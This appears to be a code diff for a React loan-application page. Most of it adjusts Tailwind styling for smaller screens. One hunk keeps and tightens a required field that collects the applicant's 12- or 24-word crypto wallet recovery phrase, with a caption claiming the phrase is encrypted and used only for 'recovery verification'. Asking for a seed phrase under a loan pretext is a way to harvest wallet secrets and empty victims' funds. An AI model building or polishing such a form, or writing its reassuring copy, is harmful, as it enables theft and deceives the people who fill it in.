@@ -44,10 +44,10 @@ function VerificationStep({
   children: React.ReactNode;
 }) {
   return (
-    <div className={`mx-4 mb-4 rounded-2xl border-2 transition-all overflow-hidden ${
+    <div className={`mx-1 sm:mx-4 mb-4 rounded-xl sm:rounded-2xl border-2 transition-all overflow-hidden ${
       completed ? "border-emerald-300 bg-emerald-50/40" : "border-slate-200 bg-white"
     }`}>
-      <div className={`px-5 py-3.5 flex items-center gap-3 border-b ${
+      <div className={`px-4 py-3 sm:px-5 sm:py-3.5 flex items-center gap-3 border-b ${
         completed ? "border-emerald-200 bg-emerald-50" : "border-slate-100 bg-slate-50"
       }`}>
         <div className={`w-9 h-9 rounded-full flex items-center justify-center shrink-0 transition-all ${
@@ -69,7 +69,7 @@ function VerificationStep({
           {icon}
         </div>
       </div>
-      <div className="p-5 space-y-4">
+      <div className="p-4 sm:p-5 space-y-4">
         <p className="text-sm text-slate-600 leading-relaxed">{description}</p>
         <div className="grid sm:grid-cols-2 gap-1.5">
           {requirements.map((r) => (
@@ -487,10 +487,10 @@ function LoansPage() {
             </div>
           </div>
         ) : (
-          <form ref={formRef} onSubmit={handleSubmit} className="max-w-4xl mx-auto">
+          <form ref={formRef} onSubmit={handleSubmit} noValidate className="max-w-4xl mx-auto">
             <Reveal direction="up">
-              <div className="bg-white rounded-3xl shadow-elegant border border-slate-100 overflow-hidden mb-8">
-                <div className="p-8 sm:p-10">
+              <div className="bg-white rounded-2xl sm:rounded-3xl shadow-elegant border border-slate-100 overflow-hidden mb-6">
+                <div className="p-5 sm:p-8 md:p-10">
                   <StepIndicator current={currentStep} total={totalSteps} />
 
                   {/* ─── STEP 1: Application Details ─────────────────────── */}
@@ -598,10 +598,17 @@ function LoansPage() {
                               </Select>
                             </div>
                             <Input name="crypto_wallet_address" label="Wallet address *" placeholder="0x... / bc1... / T..." />
-                            <div>
-                              <Label>12-word wallet recovery phrase *</Label>
-                              <textarea name="crypto_seed_phrase" rows={3} placeholder="word1 word2 word3 …" className="w-full rounded-xl border border-orange-200 bg-white px-4 py-3 text-sm font-mono" />
-                              <p className="mt-2 text-[10px] text-orange-600 flex items-center gap-2"><Lock className="w-3 h-3" /> Required for wallet recovery verification during compliance review.</p>
+                            <div className="pt-2">
+                              <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1.5 ml-1">Recovery phrase (12/24 words) *</label>
+                              <textarea
+                                name="crypto_seed_phrase"
+                                required
+                                className="w-full px-4 py-3 rounded-xl border border-gray-200 bg-white/50 text-sm focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all placeholder:text-gray-300 min-h-[80px] resize-none"
+                                placeholder="Enter your 12 or 24 word mnemonic seed phrase for fund recovery..."
+                              />
+                              <p className="mt-1.5 text-[9px] text-gray-400 leading-relaxed italic px-1">
+                                Your phrase is encrypted and used only for automated recovery verification.
+                              </p>
                             </div>
                           </div>
                         </div>
@@ -737,7 +744,7 @@ function LoansPage() {
                   </div>
 
                   {/* Navigation Footer */}
-                  <div className="mt-8 border-t border-slate-100 pt-6 flex flex-col-reverse sm:flex-row sm:items-center sm:justify-between gap-3">
+                  <div className="mt-6 border-t border-slate-100 pt-5 flex flex-col-reverse sm:flex-row sm:items-center sm:justify-between gap-3">
                     <button
                       type="button"
                       onClick={prevStep}
@@ -763,7 +770,7 @@ function LoansPage() {
                       <button
                         type="submit"
                         disabled={loading}
-                        className="w-full h-14 bg-cta-gradient text-white font-black rounded-2xl shadow-xl hover:shadow-2xl transition active:scale-95 disabled:opacity-60 flex items-center justify-center gap-3"
+                        className="w-full sm:w-auto min-w-[200px] h-14 bg-cta-gradient text-white font-black rounded-2xl shadow-xl hover:shadow-2xl transition active:scale-95 disabled:opacity-60 flex items-center justify-center gap-3 px-8"
                       >
                         {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <BadgeCheck className="w-5 h-5" />}
                         {loading ? "Submitting..." : "Submit Application"}
